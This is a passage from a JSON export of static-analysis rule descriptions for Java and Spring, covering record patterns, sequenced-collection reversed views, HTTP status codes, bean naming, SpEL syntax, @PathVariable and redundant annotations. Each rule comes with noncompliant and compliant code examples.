Square s -&gt; \"square\";\n    default -&gt; throw new IllegalArgumentException();\n  };\n}\n</pre>\n<h2>Resources</h2>\n<ul>\n  <li> <a href=\"https://openjdk.org/jeps/440\">Record Patterns</a> </li>\n  <li> <a href=\"https://openjdk.org/jeps/441\">Pattern Matching for switch</a> </li>\n  <li> <a href=\"https://docs.oracle.com/javase/tutorial/java/nutsandbolts/switch.html\">The switch Statement</a> </li>\n</ul>\n\n","impacts":[{"name":"maintainability","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"covered","ruleKey":"RSPEC-6880","summary":"Use switch instead of if-else chain to compare a variable against multiple cases","tags":["java21"],"versions":{"serverEdition":"Developer","serverVersion":"10.5.1.90531","communityVersion":"10.5.1.90531"},"cleanCodeAttribute":"CLEAR","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>Java 21 enhances Pattern Matching, introduced in Java 16, with a <em>record pattern</em> that decomposes records into local variables. This form\nshould be used when all fields of a record are accessed within a block for improved readability. Nested record patterns are also allowed and should be\nused when a record field is another record, and all its fields are accessed.</p>\n<h2>Exceptions</h2>\n<p>This rule does not apply when not all record fields are accessed. This prevents the creation of unused local variables in the decomposed record\nstructure.</p>\n<h2>How to fix it</h2>\n<p>Replace the instance check or simple pattern matching with a record pattern.</p>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<p>This example uses pattern matching but not a record pattern, even though all fields of the record are accessed in the block.</p>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nrecord Point(Float x, Float y, Float z) {}\n\nvoid print(Object obj) {\n    if (obj instanceof Point p) { // Noncompliant, because all three fields x, y, z are accessed\n        Float x = p.x;\n        Float y = p.y();\n        System.out.println(x + y + p.z);\n    }\n}\n</pre>\n<h4>Compliant solution</h4>\n<p>The compliant example uses a record pattern to decompose the record structure.</p>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nrecord Point(Float x, Float y, Float z) {}\n\nvoid print(Object obj) {\n    if (obj instanceof Point(Float x, Float y, Float z)) { // Compliant\n        System.out.println(x + y + z);\n    }\n}\n</pre>\n<h4>Noncompliant code example</h4>\n<p>This example does not use pattern matching or a record pattern. Rule <em><a\nhref=\"https://sonarsource.github.io/rspec/#/rspec/{rule:java:S6201}\">{rule:java:S6201} - Pattern matching or \"instanceOf\" operator should be\nused</a></em> would report first. When fixed using simple pattern matching instead of a record pattern, this rule ({rule:java:S6878}) will report.</p>\n<pre data-diff-id=\"2\" data-diff-type=\"noncompliant\">\nvoid print(Object obj) {\n    if (obj instanceof Point) { // Noncompliant\n        Point p = (Point) obj;\n        Float x = p.x;\n        Float y = p.y();\n        System.out.println(x + y + p.z);\n    }\n}\n</pre>\n<h4>Compliant solution</h4>\n<p>The solution compliant with both rules, {rule:java:S6201} and {rule:java:S6878}, uses pattern matching and decomposes the record structure using a\nrecord pattern.</p>\n<pre data-diff-id=\"2\" data-diff-type=\"compliant\">\nvoid print(Object obj) {\n    if (obj instanceof Point(Float x, Float y, Float z)) { // Compliant\n        System.out.println(x + y + z);\n    }\n}\n</pre>\n<h4>Noncompliant code example</h4>\n<p>This example is noncompliant because a nested record pattern could have been used.</p>\n<pre data-diff-id=\"3\" data-diff-type=\"noncompliant\">\nrecord Plane(Point normal, Float d) {}\n\nvoid print(Object obj) {\n    // Noncompliant, because all field of \"normal\" are accessed\n    if (obj instanceof Plane(Point normal, Float d)) {\n        System.out.println(normal.x + normal.y + normal.z);\n        System.out.println(d);\n    }\n}\n</pre>\n<h4>Compliant solution</h4>\n<p>This is the same example using a nested record pattern.</p>\n<pre data-diff-id=\"3\" data-diff-type=\"compliant\">\nvoid print(Object obj) {\n    if (obj instanceof Plane(Point(Float x, Float y, Float z), Float d)) { // Compliant\n        System.out.println(x + y + z);\n        System.out.println(d);\n    }\n}\n</pre>\n<h4>Compliant solution</h4>\n<p>This example uses <code>var</code> instead of replicating the field types in the record pattern, which is less verbose and keeps the code more\nreadable, especially in the case of longer type names. Also, it uses variable names that do not match the original field names. The reason for this\ncan be to avoid name collisions with fields or other local variables.</p>\n<pre>\nvoid print(Object obj) {\n    if (obj instanceof Point(var px, var py, var pz)) { // Compliant\n        System.out.println(px + py + pz);\n    }\n}\n</pre>\n<h4>Compliant solution</h4>\n<p>This example is compliant without using a record pattern, as it does not access all fields.</p>\n<pre>\nvoid print(Object obj) {\n    if (obj instanceof Point p) { // Compliant, because z is never accessed\n        Float x = p.x;\n        Float y = p.y();\n        System.out.println(x + y);\n    }\n}\n</pre>\n<h2>Resources</h2>\n<ul>\n  <li> <a href=\"https://openjdk.org/jeps/440\">JEP 440: Record Patterns</a> </li>\n</ul>\n\n","impacts":[{"name":"maintainability","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-6878","summary":"Use record pattern instead of explicit field access","tags":["java21"],"versions":{"serverEdition":"Developer","serverVersion":"10.5.1.90531","communityVersion":"10.5.1.90531"},"cleanCodeAttribute":"CLEAR","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Critical","description":"<h2>Why is this an issue?</h2>\n<p>Java 21 introduces the new Sequenced Collections API, which applies to all collections with a defined sequence on their elements, such as\n<code>LinkedList</code>, <code>TreeSet</code>, and others (see <a href=\"https://openjdk.org/jeps/431\">JEP 431</a>). For projects using Java 21 and\nonwards, use this API instead of workaround implementations that were necessary before Java 21. One of the features of the new Sequenced Collections\nAPI is <code>SequencedCollection.reversed()</code> which returns a lightweight view of the original collection, in the reverse order.</p>\n<p>This rule reports when reverse view would have been sufficient instead of a reverse copy of a sequenced collection created using a list constructor\nplus a <code>Collections.reverse(collection);</code> call.</p>\n<p>If feasible, a view should be preferred over a copy because a view is a lightweight iterator without modification of the list itself.</p>\n<h2>How to fix it</h2>\n<p>Remove <code>Collections.reverse(list);</code> and replace <code>list</code> with <code>list.reversed()</code> after.</p>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nvoid foo() {\n  var list = new ArrayList&lt;String&gt;();\n  list.add(\"A\");\n  list.add(\"B\");\n  Collections.reverse(list); // Noncompliant\n  for (var e : list) {\n    // ...\n  }\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nvoid foo() {\n  var list = new ArrayList&lt;String&gt;();\n  list.add(\"A\");\n  list.add(\"B\");\n  for (var e : list.reversed()) {  // Compliant\n    // ...\n  }\n}\n</pre>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"2\" data-diff-type=\"noncompliant\">\nvoid foo(List&lt;String&gt; list) {\n  var copy = new ArrayList&lt;String&gt;(list);\n  Collections.reverse(copy); // Noncompliant\n  for (var e : copy) {\n    // ...\n  }\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"2\" data-diff-type=\"compliant\">\nvoid foo(List&lt;String&gt; list) {\n  for (var e : list.reversed()) {  // Compliant\n    // ...\n  }\n}\n</pre>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> Java Documentation - <a href=\"https://docs.oracle.com/en/java/javase/21/docs/api/java.base/java/util/SequencedCollection.html\">Interface\n  SequencedCollection</a> </li>\n  <li> OpenJDK - <a href=\"https://openjdk.org/jeps/431\">JEP 431: Sequenced Collections</a> </li>\n  <li> Java Documentation - <a\n  href=\"https://docs.oracle.com/en/java/javase/21/core/creating-sequenced-collections-sets-and-maps.html#GUID-DCFE1D88-A0F5-47DE-A816-AEDA50B97523\">Creating Sequenced Collections, Sets, and Maps</a> </li>\n</ul>\n\n","impacts":[{"name":"maintainability","level":"HIGH"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-6877","summary":"Reverse view should be used instead of reverse copy in read-only cases","tags":["java21"],"versions":{"serverEdition":"Developer","serverVersion":"10.5.1.90531","communityVersion":"10.5.1.90531"},"cleanCodeAttribute":"CONVENTIONAL","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Critical","description":"<h2>Why is this an issue?</h2>\n<p>Java 21 introduces the new Sequenced Collections API, which is applicable to all collections with a defined sequence on their elements, such as\n<code>LinkedList</code>, <code>TreeSet</code>, and others (see <a href=\"https://openjdk.org/jeps/431\">JEP 431</a>). For projects using Java 21 and\nonwards, this API should be utilized instead of workaround implementations that were necessary before Java 21.</p>\n<p>This rule reports when a collection is iterated in reverse through explicit implementation or workarounds, instead of using the reversed view of\nthe collection.</p>\n<h2>How to fix it</h2>\n<p>Replace the reported statement with a forward-iteration over the reversed view of the collection.</p>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nvoid printLastToFirst(List&lt;String&gt; list) {\n  for (var it = list.listIterator(list.size()); it.hasPrevious();) {\n    var element = it.previous();\n    System.out.println(element);\n  }\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nvoid printLastToFirst(List&lt;String&gt; list) {\n  for (var element: list.reversed()) {\n    System.out.println(element);\n  }\n}\n</pre>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> Java Documentation - <a href=\"https://docs.oracle.com/en/java/javase/21/docs/api/java.base/java/util/SequencedCollection.html\">Interface\n  SequencedCollection</a> </li>\n  <li> OpenJDK - <a href=\"https://openjdk.org/jeps/431\">JEP 431: Sequenced Collections</a> </li>\n  <li> Java Documentation - <a\n  href=\"https://docs.oracle.com/en/java/javase/21/core/creating-sequenced-collections-sets-and-maps.html#GUID-DCFE1D88-A0F5-47DE-A816-AEDA50B97523\">Creating Sequenced Collections, Sets, and Maps</a> </li>\n</ul>\n\n","impacts":[{"name":"maintainability","level":"HIGH"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-6876","summary":"Reverse iteration should utilize reversed view","tags":["java21"],"versions":{"serverEdition":"Developer","serverVersion":"10.5.1.90531","communityVersion":"10.5.1.90531"},"cleanCodeAttribute":"CONVENTIONAL","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>The request handler function in a <code>Controller</code> should set the appropriate HTTP status code based on the operationâs success or failure.\nThis is done by returning a <code>Response</code> object with the appropriate status code.</p>\n<p>If an exception is thrown during the execution of the handler, the status code should be in the range of 4xx or 5xx. Examples of such codes are\n<code>BAD_REQUEST</code>, <code>UNAUTHORIZED</code>, <code>FORBIDDEN</code>, <code>NOT_FOUND</code>, <code>INTERNAL_SERVER_ERROR</code>,\n<code>BAD_GATEWAY</code>, <code>SERVICE_UNAVAILABLE</code>, etc.</p>\n<p>The status code should be 1xx, 2xx, or 3xx if no exception is thrown and the operation is considered successful. Such codes include\n<code>OK</code>, <code>CREATED</code>, <code>MOVED_PERMANENTLY</code>, <code>FOUND</code>, etc.</p>\n<h2>How to fix it</h2>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\n@Controller\npublic class UserController {\n    public ResponseEntity&lt;User&gt; getUserById(Long userId) {\n        try {\n            User user = userService.getUserById(userId);\n            return ResponseEntity.status(HttpStatus.INTERNAL_SERVER_ERROR).body(user); // Noncompliant: Setting 500 for a successful operation\n        } catch (Exception e) {\n            return ResponseEntity.status(HttpStatus.OK).build(); // Noncompliant: Setting 200 for exception\n        }\n    }\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\n@Controller\npublic class UserController {\n    public ResponseEntity&lt;User&gt; getUserById(Long userId) {\n        try {\n            User user = userService.getUserById(userId);\n            return ResponseEntity.ok(user); // Compliant: Setting 200 for a successful operation\n        } catch (Exception e) {\n            return ResponseEntity.status(HttpStatus.INTERNAL_SERVER_ERROR).build(); // Compliant: Setting 500 for exception\n        }\n    }\n}\n</pre>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> <a href=\"https://docs.spring.io/spring-framework/docs/current/javadoc-api/org/springframework/http/HttpStatus.html\">Spring Java Documentation -\n  HttpStatus</a> </li>\n  <li> <a href=\"https://docs.spring.io/spring-framework/docs/current/javadoc-api/org/springframework/http/ResponseEntity.html\">Spring Java\n  Documentation - ResponseEntity</a> </li>\n  <li> <a href=\"https://docs.spring.io/spring-framework/reference/web/webmvc/mvc-controller/ann-methods/responseentity.html\">Spring Framework\n  Documentation - ResponseEntity</a> </li>\n  <li> <a href=\"https://docs.spring.io/spring-framework/reference/web/webmvc/mvc-ann-rest-exceptions.html\">Spring Framework Documentation - Exception\n  Handling</a> </li>\n</ul>\n<h3>Standards</h3>\n<ul>\n  <li> <a href=\"https://www.iana.org/assignments/http-status-codes/http-status-codes.xhtml\">IANA - Hypertext Transfer Protocol (HTTP) Status Code\n  Registry</a> </li>\n</ul>\n\n","impacts":[{"name":"reliability","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"infeasible","ruleKey":"RSPEC-6863","summary":"Set appropriate Status Codes on HTTP responses","tags":["spring","best-practice"],"versions":{"serverEdition":"Developer","serverVersion":"10.4.1.88267","communityVersion":"10.4.1.88267"},"cleanCodeAttribute":"DISTINCT","type":"Bug"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>Naming conventions play a crucial role in maintaining code clarity and readability. The uniqueness of bean names in Spring configurations is vital\nto the clarity and readability of the code. When two beans share the same name within a configuration, it is not obvious to the reader which bean is\nbeing referred to. This leads to potential misunderstandings and errors.</p>\n<h2>How to fix it</h2>\n<p>To address this issue, ensure each bean within a configuration has a distinct and meaningful name. Choose names that accurately represent the\npurpose or functionality of the bean.</p>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\n@Configuration\nclass Config {\n  @Bean\n  public User user() {\n    return currentUser();\n  }\n  @Bean\n  public User user(AuthService auth) { // Noncompliant\n    return auth.user();\n  }\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\n@Configuration\nclass Config {\n  @Bean\n  public User user() {\n    return currentUser();\n  }\n  @Bean\n  public User userFromAuth(AuthService auth) {\n    return auth.user();\n  }\n}\n</pre>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> <a href=\"https://docs.spring.io/spring-framework/reference/core/beans/java/basic-concepts.html\">Spring IO - Basic concepts: @Bean and\n  @Configuration</a> </li>\n  <li> <a href=\"https://docs.spring.io/spring-framework/reference/core/beans/java/configuration-annotation.html\">Spring IO - Using the @Configuration\n  annotation</a> </li>\n  <li> <a href=\"https://docs.spring.io/spring-framework/reference/core/beans/java/bean-annotation.html\">Spring IO - Using the @Bean annotation</a>\n  </li>\n</ul>\n\n","impacts":[{"name":"reliability","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-6862","summary":"Beans in \"@Configuration\" class should have different names","tags":["spring"],"versions":{"serverEdition":"Developer","serverVersion":"10.4.1.88267","communityVersion":"10.4.1.88267"},"cleanCodeAttribute":"CLEAR","type":"Bug"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Critical","description":"<p>This rule reports syntax errors in Spring Expression Language (<code>SpEL</code>) expressions and property placeholders. It verifies that every\n<code>SpEL</code> expression and property placeholder is properly closed and that the content of each expression or placeholder is syntactically\ncorrect.</p>\n<h2>Why is this an issue?</h2>\n<p>Only the Spring framework, not the Java compiler, parses <code>SpEL</code> expression inside Spring annotations. This means that the Java compiler\ndoes not detect invalid <code>SpEL</code> expressions during compile time. They will cause exceptions during runtime instead, or even fail silently\nwhen Spring interprets the expression as a simple string literal.</p>\n<h3>Exceptions</h3>\n<p>This rule reports syntactical errors in <code>SpEL</code> expressions but does not consider semantic errors, such as unknown identifiers or\nincompatible operand data types.</p>\n<h2>How to fix it</h2>\n<p>Correct the syntax error in the SpEL expression.</p>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\n@Value(\"#{systemProperties['user.region'}\") // Noncompliant: unclosed \"[\"\nprivate String region;\n</pre>\n<pre data-diff-id=\"2\" data-diff-type=\"noncompliant\">\n@Value(\"#{'${listOfValues}' split(',')}\") // Noncompliant: missing operator\nprivate List&lt;String&gt; valuesList;\n</pre>\n<pre data-diff-id=\"3\" data-diff-type=\"noncompliant\">\n@Value(\"#{T(java.lang.Math).random() * 64h}\") // Noncompliant: invalid number\nprivate Double randPercent;\n</pre>\n<pre data-diff-id=\"4\" data-diff-type=\"noncompliant\">\n@Query(\"SELECT u FROM User u WHERE u.status = :#{#status+}\") // Noncompliant: missing operand for \"+\"\nList&lt;User&gt; findUsersByStatus(@Param(\"status\") String status);\n</pre>\n<pre data-diff-id=\"5\" data-diff-type=\"noncompliant\">\n@Value(\"${myapp.!prop}\") // Noncompliant: property key contains an exclamation mark \"!\"\nprivate String myProperty;\n</pre>\n<pre data-diff-id=\"6\" data-diff-type=\"noncompliant\">\n@Value(\"${my.property:#{1**1}}\") // Noncompliant: invalid SpEL expression \"1**1\"\nprivate Integer myValue;\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\n@Value(\"#{systemProperties['user.region']}\") // Compliant\nprivate String region;\n</pre>\n<pre data-diff-id=\"2\" data-diff-type=\"compliant\">\n@Value(\"#{'${listOfValues}'.split(',')}\") // Compliant\nprivate List&lt;String&gt; valuesList;\n</pre>\n<pre data-diff-id=\"3\" data-diff-type=\"compliant\">\n@Value(\"#{T(java.lang.Math).random() * 100.0}\") // Compliant\nprivate Double randPercent;\n</pre>\n<pre data-diff-id=\"4\" data-diff-type=\"compliant\">\n@Query(\"SELECT u FROM User u WHERE u.status = :#{#status+42}\") // Compliant\nList&lt;User&gt; findUsersByStatus(@Param(\"status\") String status);\n</pre>\n<pre data-diff-id=\"5\" data-diff-type=\"compliant\">\n@Value(\"${myapp.prop}\") // Compliant\nprivate String myProperty;\n</pre>\n<pre data-diff-id=\"6\" data-diff-type=\"compliant\">\n@Value(\"${my.property:#{1*1}}\") // Compliant\nprivate Integer myValue;\n</pre>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> Spring Framework Documentation - <a href=\"https://docs.spring.io/spring-framework/reference/core/expressions.html\">Spring Expression Language\n  (SpEL)</a> </li>\n</ul>\n\n","impacts":[{"name":"reliability","level":"HIGH"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-6857","summary":"SpEL expression should have a valid syntax","tags":["spring"],"versions":{"serverEdition":"Developer","serverVersion":"10.4.1.88267","communityVersion":"10.4.1.88267"},"cleanCodeAttribute":"CONVENTIONAL","type":"Bug"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>The <code>@PathVariable</code> annotation in Spring extracts values from the URI path and binds them to method parameters in a Spring MVC\ncontroller. It is commonly used with <code>@GetMapping</code>, <code>@PostMapping</code>, <code>@PutMapping</code>, and <code>@DeleteMapping</code> to\ncapture path variables from the URI. These annotations map HTTP requests to specific handler methods in a controller. They are part of the Spring Web\nmodule and are commonly used to define the routes for different HTTP operations in a RESTful API.</p>\n<p>If a method has a path template containing a placeholder, like \"/api/resource/{id}\", and thereâs no <code>@PathVariable</code> annotation on a\nmethod parameter to capture the id path variable, Spring will disregard the id variable.</p>\n<p>This rule will raise an issue if a method has a path template with a placeholder, but no corresponding <code>@PathVariable</code>, or\nvice-versa.</p>\n<h2>How to fix it</h2>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\n@GetMapping(\"/api/resource/{id}\")\npublic ResponseEntity&lt;String&gt; getResourceById(Long id) { // Noncompliant - The 'id' parameter will not be automatically populated with the path variable value\n  return ResponseEntity.ok(\"Fetching resource with ID: \" + id);\n}\n\n@GetMapping(\"/api/asset/\")\npublic ResponseEntity&lt;String&gt; getAssetById(@PathVariable Long id) { // Noncompliant - The 'id' parameter does not have a corresponding placeholder\n  return ResponseEntity.ok(\"Fetching asset with ID: \" + id);\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\n@GetMapping(\"/api/resource/{id}\")\npublic ResponseEntity&lt;String&gt; getResourceById(@PathVariable Long id) { // Compliant\n  return ResponseEntity.ok(\"Fetching resource with ID: \" + id);\n}\n\n@GetMapping(\"/api/asset/{id}\")\npublic ResponseEntity&lt;String&gt; getAssetById(@PathVariable Long id) {\n  return ResponseEntity.ok(\"Fetching asset with ID: \" + id);\n}\n</pre>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> <a href=\"https://spring.io/guides/tutorials/rest/\">Spring IO - Building REST services with Spring</a> </li>\n  <li> <a href=\"https://docs.spring.io/spring-framework/docs/current/javadoc-api/org/springframework/web/bind/annotation/PathVariable.html\">Spring\n  Framework API - PathVariable</a> </li>\n  <li> <a href=\"https://docs.spring.io/spring-framework/docs/current/javadoc-api/org/springframework/web/bind/annotation/GetMapping.html\">Spring\n  Framework API - GetMapping</a> </li>\n  <li> <a href=\"https://docs.spring.io/spring-framework/docs/current/javadoc-api/org/springframework/web/bind/annotation/PostMapping.html\">Spring\n  Framework API - PostMapping</a> </li>\n  <li> <a href=\"https://docs.spring.io/spring-framework/docs/current/javadoc-api/org/springframework/web/bind/annotation/PutMapping.html\">Spring\n  Framework API - PutMapping</a> </li>\n  <li> <a href=\"https://docs.spring.io/spring-framework/docs/current/javadoc-api/org/springframework/web/bind/annotation/DeleteMapping.html\">Spring\n  Framework API - DeleteMapping</a> </li>\n</ul>\n<h3>Articles &amp; blog posts</h3>\n<ul>\n  <li> <a href=\"https://www.baeldung.com/spring-pathvariable\">Baeldung - Spring @PathVariable</a> </li>\n</ul>\n\n","impacts":[{"name":"reliability","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-6856","summary":"\"@PathVariable\" annotation should be present if a path variable is used","tags":["spring"],"versions":{"serverEdition":"Developer","serverVersion":"10.4.1.88267","communityVersion":"10.4.1.88267"},"cleanCodeAttribute":"LOGICAL","type":"Bug"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<p>Spring proxies are based on the <strong>Proxy design pattern</strong> and serve as intermediaries to other resources, offering extra features at a\nslight performance penalty. For example, they facilitate lazy resource initialization and data caching.</p>\n<p>The <code>@Configuration</code> annotation enables this mechanism by default through the <code>proxyBeanMethods</code> attribute set to\n<code>true</code>. This ensures that the <code>@Bean</code> methods are proxied in order to enforce bean lifecycle behavior, e.g. to return shared\nsingleton bean instances even in case of direct <code>@Bean</code> method calls in user code. This functionality is achieved via method interception,\nimplemented through a runtime-generated <strong><a href=\"https://github.com/cglib/cglib/wiki\">CGLIB</a></strong> subclass.</p>\n<h2>Why is this an issue?</h2>\n<p>When setting the <code>proxyBeanMethods</code> attribute to <code>false</code> the <code>@Bean</code> methods are not proxied and this is similar\nto removing the <code>@Configuration</code> stereotype. In this scenario, <code>@Bean</code> methods within the <code>@Configuration</code> annotated\nclass operate in <a href=\"https://docs.spring.io/spring-framework/docs/current/javadoc-api/org/springframework/context/annotation/Bean.html\"><em>lite\nmode</em></a>, resulting in a new bean creation each time the method is invoked.</p>\n<p>For <code>Singleton</code> beans, this could cause unexpected outcomes as the bean is created multiple times instead of being created once and\ncached.</p>\n<p>The rule raises an issue when the <code>proxyBeanMethods</code> attribute is set to <code>false</code> and the <code>@Bean</code> method of a\n<code>Singleton</code> bean is directly invoked in the <code>@Configuration</code> annotated class code.</p>\n<h2>How to fix it</h2>\n<p>The issue can be fixed in the following ways:</p>\n<ul>\n  <li> Not invoking the <code>@Bean</code> method directly, but rather injecting the bean in the context and using it, by means of <code>@Bean</code>\n  <a href=\"https://docs.spring.io/spring-framework/reference/core/beans/java/bean-annotation.html#beans-java-dependencies\">method parameters</a>.\n  </li>\n  <li> If the performance penalty is negligible, consider not disabling the <code>proxyBeanMethods</code> attribute, so that the <code>@Bean</code>\n  methods are proxied and the bean lifecycle is enforced. </li>\n</ul>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<p>In the example below, every instance of <code>PrototypeBean</code> will have a different instance of <code>SingletonBean</code>, as\n<code>singletonBean()</code> is called directly from <code>prototypeBean()</code>.</p>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\n@Configuration(proxyBeanMethods = false)\nclass ConfigurationExample {\n  @Bean\n  public SingletonBean singletonBean() {\n    return new SingletonBean();\n  }\n\n  @Bean\n  @Scope(\"prototype\")\n  public PrototypeBean prototypeBean() {\n    return new PrototypeBean(singletonBean()); // Noncompliant: a \"singletonBean\" is created every time a prototypeBean is created\n  }\n\n  class SingletonBean {\n    // ...\n  }\n\n  class PrototypeBean {\n    // ...\n\n    public PrototypeBean(SingletonBean singletonBean) {\n      // ...\n    }\n\n    // ...\n  }\n}\n</pre>\n<h4>Compliant solution</h4>\n<p>The compliant solution relies on the <code>@Bean</code> method parameter to automatically inject the <code>SingletonBean</code> from the\n<code>ApplicationContext</code>. This way every instance of <code>PrototypeBean</code> will have the same instance of <code>SingletonBean</code>.</p>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\n@Configuration(proxyBeanMethods = false)\nclass ConfigurationExample {\n  @Bean\n  public SingletonBean singletonBean() {\n    return new SingletonBean();\n  }\n\n  @Bean\n  @Scope(\"prototype\")\n  public PrototypeBean prototypeBean(SingletonBean singletonBean) { // Compliant, the singletonBean is injected in the context and used by every prototypeBean\n    return new PrototypeBean(singletonBean);\n  }\n\n  class SingletonBean {\n    // ...\n  }\n\n  class PrototypeBean {\n    // ...\n\n    public PrototypeBean(SingletonBean singletonBean) {\n      // ...\n    }\n\n    // ...\n  }\n}\n</pre>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> Spring - <a\n  href=\"https://docs.spring.io/spring-framework/docs/current/javadoc-api/org/springframework/context/annotation/Configuration.html#proxyBeanMethods()\">Configuration - proxyBeanMethods</a> </li>\n  <li> Spring - <a href=\"https://docs.spring.io/spring-framework/reference/core/aop/proxying.html\">Proxying Mechanisms</a> </li>\n  <li> Spring - <a href=\"https://docs.spring.io/spring-framework/reference/core/beans/java/bean-annotation.html#beans-java-dependencies\">Bean\n  Annotation - Dependencies</a> </li>\n  <li> GitHub - <a href=\"https://github.com/cglib/cglib/wiki\">CGLIB</a> </li>\n</ul>\n<h3>Articles &amp; blog posts</h3>\n<ul>\n  <li> Medium - <a href=\"https://blog.devgenius.io/demystifying-proxy-in-spring-3ab536046b11\">Demystifying Proxy in Spring</a> </li>\n</ul>\n\n","impacts":[{"name":"reliability","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"infeasible","ruleKey":"RSPEC-6838","summary":"\"@Bean\" methods for Singleton should not be invoked in \"@Configuration\" when proxyBeanMethods is false","tags":["spring"],"versions":{"serverEdition":"Developer","serverVersion":"10.4.1.88267","communityVersion":"10.4.1.88267"},"cleanCodeAttribute":"LOGICAL","type":"Bug"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>The Spring frameworkâs <code>@RestController</code> annotation is equivalent to using the <code>@Controller</code> and <code>@ResponseBody</code>\nannotations together. As such, it is redundant to add a <code>@ResponseBody</code> annotation when the class is already annotated with\n<code>@RestController</code>.</p>\n<h2>How to fix it</h2>\n<p>Remove the <code>@ResponseBody</code> annotation from the class or method.</p>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\n@RestController\npublic class MyController {\n  @ResponseBody // Noncompliant, the @RestController annotation already implies @ResponseBody\n  @RequestMapping(\"/hello\")\n  public String hello() {\n    return \"Hello World!\";\n  }\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\n@RestController\npublic class MyController {\n  @RequestMapping(\"/hello\")\n  public String hello() {\n    return \"Hello World!\";\n  }\n}\n</pre>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"2\" data-diff-type=\"noncompliant\">\n@RestController\n@ResponseBody // Noncompliant, the @RestController annotation already implies @ResponseBody\npublic class MyController {\n  @RequestMapping(\"/hello\")\n  public String hello() {\n    return \"Hello World!\";\n  }\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"2\" data-diff-type=\"compliant\">\n@RestController\npublic class MyController {\n  @RequestMapping(\"/hello\")\n  public String hello() {\n    return \"Hello World!\";\n  }\n}\n</pre>\n<h2>Resources</h2>\n<h3>Articles &amp; blog posts</h3>\n<ul>\n  <li> Spring Guides - <a href=\"https://spring.io/guides/gs/rest-service/\">Building a RESTful Web Service</a> </li>\n  <li> Baeldung - <a href=\"https://www.baeldung.com/spring-controller-vs-restcontroller\">The Spring @Controller and @RestController Annotations</a>\n  </li>\n  <li> Baeldung - <a href=\"https://www.baeldung.com/spring-request-response-body\">Springâs RequestBody and ResponseBody Annotations</a> </li>\n</ul>\n\n","impacts":[{"name":"maintainability","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"targeted","ruleKey":"RSPEC-6837","summary":"Superfluous \"@ResponseBody\" annotations should be 